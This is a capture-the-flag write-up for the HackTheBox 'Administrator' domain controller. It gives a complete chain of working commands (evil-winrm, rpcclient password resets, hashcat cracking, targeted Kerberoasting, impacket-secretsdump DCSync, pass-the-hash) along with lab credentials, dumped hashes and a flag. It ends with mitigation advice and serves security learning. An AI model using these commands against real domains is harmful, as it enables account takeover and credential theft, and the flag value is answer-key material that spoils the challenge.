# Administrator — HackTheBox Writeup

**Platform:** HackTheBox  
**OS:** Windows Server 2022 (Domain Controller)  
**Difficulty:** Medium  
**IP:** `10.129.213.179`  
**Domain:** `administrator.htb`

---

## Quick Summary

This is an Active Directory Domain Controller target. Initial access is via a low-privilege domain user (Olivia) who has WinRM access. The privilege escalation chain exploits **ACL abuse at every step** — no server-side exploits needed — culminating in **DCSync**, which gives us every credential in the domain, including the Administrator's NT hash.

---

## Attack Path

```
Olivia (WinRM)
  └── Michael    [GenericAll → password reset]
    └── Benjamin [ForceChangePassword → password reset]
      └── Emily  [Backup.psafe3 crack → WinRM]
        └── Ethan [GenericWrite → Targeted Kerberoasting]
          └── Domain Admin [DCSync → full hash dump → PTH]
```

---

## Step 1 — Initial Access: WinRM as Olivia

Port 5985 (WinRM) was open — Olivia is in the `Remote Management Users` group.

```bash
evil-winrm -i 10.129.213.179 -u Olivia -p ichliebedich
```

---

## Step 2 — Olivia → Michael (GenericAll)

Olivia has **GenericAll** over Michael — full account control including password reset.

```bash
rpcclient -U administrator.htb/Olivia%ichliebedich 10.129.213.179 \
  -c "setuserinfo2 michael 23 'MichaelPassword123!'"
```

> **Note:** `net user michael /domain` does NOT work for GenericAll — it triggers a permission check. `rpcclient setuserinfo2` writes the attribute directly.

---

## Step 3 — Michael → Benjamin (ForceChangePassword)

Michael has **ForceChangePassword** on Benjamin — can reset his password without knowing the current one.

```bash
rpcclient -U administrator.htb/michael%MichaelPassword123! 10.129.213.179 \
  -c "setuserinfo2 benjamin 23 'BenjaminPassword123!'"
```

ForceChangePassword maps to extended right `00299570-746d-4e89-aea9-954a531c1942`.

---

## Step 4 — Benjamin → Backup.psafe3 → Emily

Benjamin is in `Share Moderators` and has FTP access. `Backup.psafe3` (Password Safe v3 database) found on the share.

```bash
ftp 10.129.213.179
# Login: Benjamin / BenjaminPassword123!
ftp> get Backup.psafe3
```

```bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
# Master password: tekieromucho
```

**Emily's credentials:** `Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

---

## Step 5 — Emily → Ethan (GenericWrite → Targeted Kerberoasting)

Emily has **GenericWrite** on Ethan. Standard Targeted Kerberoasting abuse:

**5a — Add fake SPN (as Emily via WinRM):**
```powershell
setspn -a fake/dc.administrator.htb:80 ethan
```

**5b — Request TGS:**
```bash
impacket-GetUserSPNs administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb \
  -request-user ethan -dc-ip 10.129.213.179 -outputfile ethan_tgs.hash
```

**5c — Crack offline:**
```bash
hashcat -m 13100 -a 0 ethan_tgs.hash /usr/share/wordlists/rockyou.txt --show
# Cracked: limpbizkit
```

---

## Step 6 — Ethan → Domain Compromise (DCSync)

**This is the endgame.** Ethan has:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

Together these constitute **DCSync privileges** — the ability to pull all password hashes from the DC's NTDS.DIT, simulating a Domain Controller replication sync.

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.213.179
```

```
Administrator:500:...:3dc553ce4b9fd20bd016e098d2d2fd2e:::
krbtgt:502:...:1181ba47d45fa2c76385a82409cbfaf6:::
```

---

## Step 7 — Pass-the-Hash as Administrator

With the Administrator NT hash, no plaintext needed:

```bash
evil-winrm -i 10.129.213.179 -u administrator \
  -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

→ **NT AUTHORITY\SYSTEM** — full Domain Controller access.

---

## Key Takeaways

| Technique | Why It Worked |
|-----------|---------------|
| **GenericAll** | Subsumes all write permissions — `setuserinfo2` via RPC bypasses `net user` restrictions |
| **ForceChangePassword** | Extended right allows password overwrite without knowing current value |
| **Targeted Kerberoasting** | GenericWrite lets you add any SPN — request TGS → crack offline |
| **DCSync** | `GetChanges` + `GetChanges-All` = full NTDS.DIT dump over the network |
| **Pass-the-Hash** | Windows NTLM auth verifies hash, not password — no plaintext needed |

## Flags
| Flag | Value |
|------|-------|
| user.txt | `3ff853d4941be6f97bb9ca31e41d813c` (Emily's Desktop) |
| root.txt | Captured via Administrator PTH |

---

## Mitigation

- **BloodHound** regularly to audit ACLs — GenericAll, ForceChangePassword, GenericWrite on users are all exploitable
- Monitor Event ID `4662` on DCs for DCSync-style replication calls from non-DC accounts
- Restrict `DS-Replication-Get-Changes*` extended rights — only DCs should have them
- Enforce strong master passwords on Password Safe / credential manager databases
